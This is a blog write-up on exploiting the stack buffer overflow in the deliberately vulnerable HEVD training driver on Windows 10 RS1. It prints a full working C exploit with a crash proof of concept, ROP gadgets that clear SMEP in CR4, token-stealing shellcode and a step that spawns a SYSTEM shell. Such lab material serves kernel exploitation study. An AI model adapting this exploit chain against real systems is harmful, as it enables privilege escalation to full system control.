---
layout: single
title:  "HEVD - Stack Overflow Windows 10 RS1"
date:   2022-01-06 20:46:55.487948
categories: Windows Kernel
---
# Exploiting Buffer Overflow

## Finding The IOCTL
For start, we need to find the `IOCTL` in order to trigger the StackBufferOverflow handler.
After looking at ida we can see the following-

![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220102192541.png)

The `IOCTL` is `0x222003`.


## Code Overview
Looking at `BufferOverflowStack` function -

![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220102193004.png)

We can see it takes two arguments, `UserBuffer` and `Size`.
Where `Size` is the size of `UserBuffer`.

Let's go over the important parts here,
First, We can see there is a 2048 bytes buffer allocation, I named the variable "local_allocated_buffer".
Seconed, the buffer is being filled with zeros.

```c
char local_allocated_buffer[2048];
memset(local_allocated_buffer, 0, sizeof(local_allocated_buffer));
```

Then we can see a call to `ProbeForRead` which validates that `UserBuffer` is allocated in user space.
Last, we see the following `memmove` call -

```C
memmove(local_allocated_buffer, UserBuffer, Size);
```

This line is where the vulnerability occures, the `UserBuffer` is being moved into `local_allocated_buffer` without validating that `Size <= 2048`, this is a vanilla buffer overflow .

## Exploiting The Vulnerability
Let's write a POC for crashing the system -

```c
#include <iostream>
#include <Windows.h>

#define IO_CODE 0x222003

int main() {

	auto hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "Unable to get a handle to the driver" << std::endl;
		exit(1);
	}

	DWORD bytesReturned;

	char exploitBuffer[0x1000]; // 0x800 = 2048.

	memset(exploitBuffer, 'A', sizeof(exploitBuffer));

	DeviceIoControl(hDevice, IO_CODE, exploitBuffer, sizeof(exploitBuffer), NULL, 0, &bytesReturned, NULL);

	CloseHandle(hDevice);

	return 0;
}
```

Here, we supply a buffer in size of `0x1000` which is `4096` bytes.
Running the above is causing a system crash -

![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220104094251.png)

We can see it happend during the `ret` instruction, Let's dump the stack to see the address we are attempting to return to -

![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220104094820.png)

Awesome, it means we can control `rip` when returning from the function.

### Finding ret Exact Offest

We need to find the exact offset of the `ret` instruction, we can do it by using some pattern generator like this one - [wiremask.eu](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

Or, we can just look at the assembly and figure it out -

From xpn's blog -
![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220104121456.png)

We can see that our data is `800h` in size, adding 8 bytes to that because of `rbp` being pushed to the stack at the start of the function and we get `808h=2056`, this is the size of the buffer, now we want to add 8 more bytes that will be used for `rip`.

```c
char exploit[2056 + 8];
memset(exploit, 'A', sizeof(exploit-8));
*(unsigned long long *)(exploit + 2056) = (unsigned long long)shellcode;
```

The above code would have been great if we were to exploit Window 7, but, since Windows 8.1 we have SMEP in place so we can't execute our shellcode from user space. Or can we?
Last blog I coverd one way of bypassing SMEP by flipping a bit in the pte, this time we are going to use ROP in order to flip a bit in cr4. If you don't know what SMEP is there is a lot of information about it in google so just search it, or refer to my last blog post.

### Finding ROP Gadgets
The first gadget we are going to use is -

```asm
pop rcx
ret
```

We can use a tool like [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)

```bash
ROPgadget --binary /mnt/c/Windows/System32/ntoskrnl.exe | grep "pop rcx ; ret"
```

![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220105142211.png)

Unfortunately, at the time writing this part I didn't have a setup so I am going to use the offsets from h0mbre's blog.

As he states in his blog we can find the gadget we are after in `HvlEndSystemInterrupt` -

```
kd> uf HvlEndSystemInterrupt
nt!HvlEndSystemInterrupt:
fffff800`10dc1560 4851            push    rcx
fffff800`10dc1562 50              push    rax
fffff800`10dc1563 52              push    rdx
fffff800`10dc1564 65488b142588610000 mov   rdx,qword ptr gs:[6188h]
fffff800`10dc156d b970000040      mov     ecx,40000070h
fffff800`10dc1572 0fba3200        btr     dword ptr [rdx],0
fffff800`10dc1576 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff800`10dc157e)

nt!HvlEndSystemInterrupt+0x18:
fffff800`10dc1578 33c0            xor     eax,eax
fffff800`10dc157a 8bd0            mov     edx,eax
fffff800`10dc157c 0f30            wrmsr

nt!HvlEndSystemInterrupt+0x1e:
fffff800`10dc157e 5a              pop     rdx
fffff800`10dc157f 58              pop     rax
fffff800`10dc1580 59              pop     rcx // Gadget at offset from nt: +0x146580
fffff800`10dc1581 c3              ret
```

We can set a value in `rcx` as we can see at the assembly.
The seconed gadget we are looking for is -

```asm
mov cr4, rcx
ret
```

The above gadget can be found at KiEnableXSave -

```
kd> uf nt!KiEnableXSave
nt!KiEnableXSave:

---SNIP---

nt! ?? ::OKHAJAOM::`string'+0x32fc:
fffff800`1105142c 480fbaf112      btr     rcx,12h
fffff800`11051431 0f22e1          mov     cr4,rcx // Gadget at offset from nt: +0x3D6431
fffff800`11051434 c3              ret
```

### Final Exploit Code
```c
#include <iostream>
#include <Windows.h>
#include <Psapi.h>

#define IO_CODE 0x222003

unsigned long long getKernelBaseAddress() {

	void* lpImageBase[1024];
	unsigned long lpcbNeeded;

	int baseOfDrivers = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);

	if (!baseOfDrivers)
	{
		std::cout << "[-] Error! Unable to invoke EnumDeviceDrivers(). Error: %d\n" << GetLastError() << std::endl;
		exit(1);
	}

	// ntoskrnl.exe is the first module dumped in the array.
	unsigned long long kernelBaseAddress = (unsigned long long)lpImageBase[0];

	std::cout << "[+] ntoskrnl.exe is located at: 0x%llx\n" << kernelBaseAddress << std::endl;

	return kernelBaseAddress;
}

void sendPayload(HANDLE hDevice, ULONG64 kernel_base) {

    std::cout << "[+] Allocating RWX shellcode..." << std::endl;

    // slightly altered shellcode from 
    // https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c
    // thank you @Cneelis
    BYTE shellcode[] =
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
        "\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
        "\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
        "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
        //find_system_proc:
        "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
        "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
        "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
        "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
        "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
        //found_system:
        "\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
        "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
        "\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
        "\x48\x83\xC4\x40"                          // add rsp, 040h
        "\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
        "\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
        "\xc3";

    LPVOID shellcode_addr = VirtualAlloc(NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_addr, shellcode, sizeof(shellcode));

    std::cout << "[+] Shellcode allocated in userland at: 0x" << (ULONG64)shellcode_addr << std::endl;

    BYTE input_buff[2088] = { 0 };

    ULONG64 pop_rcx_offset = kernel_base + 0x146580; // gadget 1
    std::cout << "[+] POP RCX gadget located at: 0x" << pop_rcx_offset << std::endl;
    ULONG64 rcx_value = 0x70678; // value we want placed in cr4
    ULONG64 mov_cr4_offset = kernel_base + 0x3D6431; // gadget 2
    std::cout << "[+] MOV CR4, RCX gadget located at: 0x" << mov_cr4_offset << std::endl;


    memset(input_buff, '\x41', 2056);
    memcpy(input_buff + 2056, (PULONG64)&pop_rcx_offset, 8); // pop rcx
    memcpy(input_buff + 2064, (PULONG64)&rcx_value, 8); // disable SMEP value
    memcpy(input_buff + 2072, (PULONG64)&mov_cr4_offset, 8); // mov cr4, rcx
    memcpy(input_buff + 2080, (PULONG64)&shellcode_addr, 8); // shellcode

    std::cout << "[+] Input buff located at: 0x" << (INT64)&input_buff << std::endl;

    DWORD bytes_ret = 0x0;

    std::cout << "[+] Sending payload..." << std::endl;

    int result = DeviceIoControl(hDevice,
        IO_CODE,
        input_buff,
        sizeof(input_buff),
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        std::cout << "[-] DeviceIoControl failed!" << std::endl;
    }
}

void spawnShell() {
    std::cout << "[+] Spawning nt authority/system shell..." << std::endl;

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };

    CreateProcessA("C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi);
}

int main() {

	auto hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[-] Unable to get a handle to the driver" << std::endl;
		exit(1);
	}

    auto kernelBase = getKernelBaseAddress();

    sendPayload(hDevice, kernelBase);
    CloseHandle(hDevice);
    spawnShell();

	return 0;
}
```


The picture is from h0mbre's blog, again, I didn't have a setup at the time writing this part, but I can promise you it worked on my machine ;)

![](https://raw.githubusercontent.com/amitschendel/amitschendel.github.io/master/assets/images/Pasted%20image%2020220106203415.png)

Hopefully in the next write up I am going to write about Buffer Overflow with GS, on RS5.
Thank you for reading, and thanks to all the amazing write ups out there that I can study from.

## Sources
- [h0mbre](https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#)
- [xpn](https://blog.xpnsec.com/hevd-stack-overflow/)

